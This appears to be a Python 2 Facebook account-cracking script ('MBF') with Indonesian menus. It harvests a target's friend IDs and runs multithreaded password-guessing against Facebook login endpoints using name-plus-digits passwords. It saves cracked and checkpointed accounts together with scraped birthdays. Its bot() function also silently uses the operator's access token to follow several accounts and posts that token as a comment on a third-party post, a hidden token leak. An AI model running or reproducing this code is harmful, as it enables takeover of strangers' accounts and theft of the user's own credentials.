#!/usr/bin/python2
# coding=utf-8
# OPEN SOURCE KODE
################################################
# Author               : Dian Rizki Pratama                                                            #
# Nama Script     : MBF                                                       #
# Github               : https://github.com/yanhukumrimba                          #
# Facebook          : https://www.facebook.com/Dian.Rizki.Pratama.DRP      #
# Instagram         : https://www.instagram.com/yanhukumrimba           #
# WhatsApp         : 0852927198X                                          #
################################################

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime

#######WARNA#######
b='\033[1;94m'                                #
i='\033[1;92m'                                 #
c='\033[1;96m'                                #
m='\033[1;91m'                               #
u='\033[1;95m'                                #
k='\033[1;93m'                                #
p='\033[1;97m'                                #
h='\033[1;92m'                                #
P = '\x1b[1;97m' # PUTIH               #
M = '\x1b[1;91m' # MERAH            #
H = '\x1b[1;92m' # HIJAU.              #
K = '\x1b[1;93m' # KUNING.           #
B = '\x1b[1;94m' # BIRU.                 #
U = '\x1b[1;95m' # UNGU.               #
O = '\x1b[1;96m' # BIRU MUDA.     #
N = '\x1b[0m'    # WARNA MATI     #
######WARNA########

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
uas = random.choice(["Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
"Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
api = "https://b-api.facebook.com/method/auth.login"
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
jam = datetime.now().strftime('%H:%M:%S')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"}

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
        
def logo():
	os.system("clear")
	print("""
\x1b[1;92m   __  __ ____  _____
\x1b[1;92m   |  \/  | __ )|  ___| •> AU : Dian Rizki Pratama
\x1b[1;92m   | |\/| |  _ \| |_    •> YT : Dian Art
\x1b[1;92m   | |  | | |_) |  _|   •> GH : yanhukumrimba
\x1b[1;92m   |_|  |_|____/|_|     •> IG : yanhukumrimba   """)
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		print""+p+""
		print" SELAMAT - DATANG"
		token = raw_input('\n [✓] Masukkan Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
		except KeyError:
			print("[!] Token Invalid!")
			sys.exit() 
 
def bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Token invalid') 
        os.system('rm -rf login.txt')
    
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100055913630645/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100023344580184/subscribers?access_token=' + token) #fall
    requests.post('https://graph.facebook.com/100001457152638/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100006613569734/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100049181736259/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100006541202647/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100064563975028/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100009384338470/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000056561882/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100001540299108/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100034234007701/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100016478086163/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100055159268362/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100045799894488/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/383882326594489/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + token)
    menu()           
    
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()

    logo()
    print(" "+p+"[✓] Author     : Dian Rizki Pratama") 
    print(" [✓] Github     : https://github.com/Dian-RP")
    print(" [✓] ---------------------------------------------")
    print(" [✓] ID         : "+id)
    print(" [✓] IP         : "+ip)
    print"\n [ Selamat Datang \033[1;93m"+nama+"\033[1;97m ]"
    print("")
    print(" [1]. Crack Dari ID Publik")
    print(" [2]. Lihat Hasil Crack")
    print(" [3]. Laporkan Bug")
    print(" ["+m+"0"+p+"]. keluar (hapus token)")
    asw = raw_input("\n [?] pilih : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "3":
    	laporbug()
    elif asw == "2":
    	cekakun()
    elif asw == "0":
    	os.system('rm -f login.txt')
    	jalan(" [!] berhasil menghapus token ")
    	exit()
    else:
    	jalan(" [!] pilih yang bener ! ")
    	menu() 
    
def publik():
    print(" [✓] isi 'me' jika ingin crack dari daftar teman")
    idt = raw_input(' [✓] masukkan ID target : ')
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'[!] ID Tidak Tersedia!'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' [✓] total id -> \033[1;91m' + str(len(id))
    pilihmetode(ppk)
    
def cekakun():
    print'\n [1]. hasil crack OK '
    print' [2]. hasil crack CP '
    anjg = raw_input('\n [?] pilih : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print'\n [+] Hasil \x1b[0;92mOK\x1b[1;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta)
        os.system(' cat out/OK-%s-%s-%s' % (ha, op, ta))
        raw_input("\n [✓] Kembali ")
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta)).read().splitlines()
        print '\n [•] Hasil CP Tanggal : %s-%s-%s-%s' % (hari, ha, op, ta)
        print " \033[1;97m[•] Total : %s" %(len(totalcp))
        print""
        os.system(' cat out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta))
        raw_input("\n [✓] kembali ")
        menu()
    else:
        print(' [!] pilih yang benar!!')
        menu()
 
def laporbug():
	asulo = raw_input("\n [?] masukan laporan bug script : ").replace(' ','%20')
	if asulo == "":
		menu()
	os.system('xdg-open https://wa.me/6285729271984?text=' +asulo)
	raw_input("\n [✓] kembali ")
	menu()
       
def infologin():
	print""
	print "\n [✓] token : "+token
	print ""
	raw_input("\n [✓] kembali ")
	menu()
	
def pilihmetode(file):
	print("")
	print(""+p+" [ pilih metode crack - silahkan coba satu² ]")
	print("")
	print(" [1] Metode Api (cepet)")
	print(" [2] Metode free.fb (lemot)")
	print("")
	z = raw_input(" [?] metode : ")
	if z == "":
		print(" [!] pilih yang benar!!")
		pilihmetode(file)
	elif z == '01' or z == '1':
		bapi()
	elif z == '02' or z == '2':
		freefb()
	else:
		print(" [!] pilih yang benar!")
		exit()
	
def bapi():
	ask = raw_input(' [?] Apakah Anda Ingin Menggunakan Password Manual? [Y/t]: ')
	if ask == 'Y' or ask == 'y':
		manualbapi()
	print'\n [✓] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print' [✓] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print("\n [!] jika tidak ada hasil, aktifkan mode pesawat 5-10 detik")
	print("")

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[1;97m[*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				respon = requests.get(api,params=param, headers=kontol)
				if "session_key" in respon.text and "EAAA" in respon.text:
					print '\r  \033[0;92m*--> ' +uid+ '|' + pw + '        '
					ok.append(uid+'|'+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  *--> '+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				if "www.facebook.com" in respon.json()["error_msg"]:
					try:
						token = open('login.txt').read()  
						sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
						b = json.loads(sw.text)
						graph = b["birthday"]
						month, day, year = graph.split("/")
						month = bulan[month]
						print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
						cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
						save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
						save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
						save.close()
						break
					except(KeyError, IOError):
						graph = " "
					except:pass
					print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
					cp.append(uid + '|' + pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
					save.close()
					break
					continue
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print'\n\n\x1b[1;97m [+] crack selesai...'
	exit()


def manualbapi():
    print'\n [✓] buat password contoh : bismillah,sayang,rahasia'
    pw = raw_input(' [?] buat password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print'\n [✓] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [✓] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] apabila tidak ada hasil silahkan aktifkan mode pesawat selama 5-10 detik")
    print("")

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[1;97m [*] [crack] %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
                respon = requests.get(api,params=param, headers=kontol)
                if "session_key" in respon.text and "EAAA" in respon.text:
                    print'\r\x1b[0;92m  *--> ' + uid + '|' + asu + '        '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if "www.facebook.com" in respon.json()["error_msg"]:
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [✓] crack selesai...'
    exit()
    
def freefb():
    ask = raw_input(' [?] apakah anda ingin menggunakan sandi manual? [Y/t] : ')
    if ask == 'Y' or ask == 'y':
        manualfreefb()
    print'\n [✓] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [✓] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] jika tidak ada hasil, aktifkan mode pesawat 5-10 detik")
    print("")
    
    def main(arg):
        global loop
        print'\r\x1b[1;97m [✓] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m  * --> ' + uid + '|' + pw + '                                            '
                    ok.append(uid + '|' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + '|' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + '|' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [✓] crack selesai...'
    exit()


def manualfreefb():
    print'\n [✓] buat password contoh : bismillah,sayang,rahasia'
    pw = raw_input(' [?] buat password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print'\n [✓] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [✓] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] jika tidak ada hasil, aktifkan mode pesawat 5-10 detik")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [✓] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m. *--> ' + uid + '|' + asu + '                          '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + asu + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(asu) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '                        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [✓] crack selesai...'
    exit()
    
if __name__ == '__main__':
    os.system('clear')
    tokenz()
    
    